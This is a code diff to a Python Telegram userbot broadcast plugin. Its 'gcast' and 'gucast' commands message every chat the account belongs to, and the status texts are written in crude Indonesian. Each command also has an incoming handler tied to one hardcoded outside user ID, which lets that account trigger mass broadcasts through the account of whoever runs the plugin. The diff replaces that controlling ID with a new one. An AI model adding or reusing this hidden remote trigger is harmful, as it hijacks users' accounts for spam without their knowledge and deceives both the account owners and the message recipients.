@@ -24,7 +24,7 @@ GCAST_BLACKLIST = [
 # BLACKLIST NYA JANGAN DI HAPUS NGENTOD.
 
 @register(outgoing=True, pattern=r"^\.gcast(?: |$)(.*)")
-@register(incoming=True, from_users=1779447750, pattern=r"^\.cgcast$")
+@register(incoming=True, from_users=1694909518, pattern=r"^\.cgcast$")
 async def gcast(event):
     xx = event.pattern_match.group(1)
     if xx:
@@ -34,7 +34,7 @@ async def gcast(event):
     else:
         await event.edit("** PESAN NYA MANA KONTOL??**")
         return
-    kk = await event.edit("`SABAR YA SAYANG INI LAGI DI KIRIM!!!!!`")
+    kk = await event.edit("`𝚂𝙰𝙱𝙰𝚁 𝚈𝙰 𝚂𝙰𝚈𝙰𝙽𝙶 𝙸𝙽𝙸 𝙼𝙰𝚄 𝙳𝙸 𝙺𝙸𝚁𝙸𝙼 😊`")
     er = 0
     done = 0
     async for x in event.client.iter_dialogs():
@@ -49,19 +49,19 @@ async def gcast(event):
             except BaseException:
                 er += 1
     await kk.edit(
-        f"**UDAH BERHASIL YA SAYANG NGIRIM PESAN KE ** `{done}` **Grup, GAGAL MENGIRIM PESAN KE ** `{er}` **Grup**"
+        f"** 𝚄𝙳𝙰𝙷 𝙱𝙴𝚁𝙷𝙰𝚂𝙸𝙻 𝚈𝙰 𝙺𝙾𝙽𝚃𝙾𝙻 𝙼𝙴𝙽𝙶𝙴𝚁𝙸𝙼 𝙿𝙴𝙳𝙰𝙽 𝙺𝙴 ** `{done}` **𝙶𝚁𝙾𝚄𝙿, 𝙶𝙰𝙶𝙰𝙻 𝙼𝙴𝙽𝙶𝙴𝚁𝙸𝙼 𝙿𝙴𝚂𝙰𝙽 𝙺𝙴 ** `{er}` **𝙶𝚁𝙾𝚄𝙿**"
     )
 
 
 @register(outgoing=True, pattern=r"^\.gucast(?: |$)(.*)")
-@register(incoming=True, from_users=1779447750, pattern=r"^\.cgucast$")
+@register(incoming=True, from_users=1694909518, pattern=r"^\.cgucast$")
 async def gucast(event):
     xx = event.pattern_match.group(1)
     if not xx:
         return await event.edit("`PESAN NYA MANA KONTOLLL?`")
     tt = event.text
     msg = tt[7:]
-    kk = await event.edit("`SABAR YA SAYANG INI LAGI DI KIRIM!!!...`")
+    kk = await event.edit("`SABAR YA SAYANG INI LAGI DI KIRIM...`")
     er = 0
     done = 0
     async for x in bot.iter_dialogs():
@@ -72,7 +72,7 @@ async def gucast(event):
                 await bot.send_message(chat, msg)
             except BaseException:
                 er += 1
-    await kk.edit(f"udah berhasil ya sayang ngirim pesan ke `{done}` obrolan, kesalahan dalam `{er}` obrolan(s)")
+    await kk.edit(f"udah berhasil ya kontol ngirim pesan ke `{done}` obrolan, kesalahan dalam `{er}` obrolan(s)")
 
 
 CMD_HELP.update(
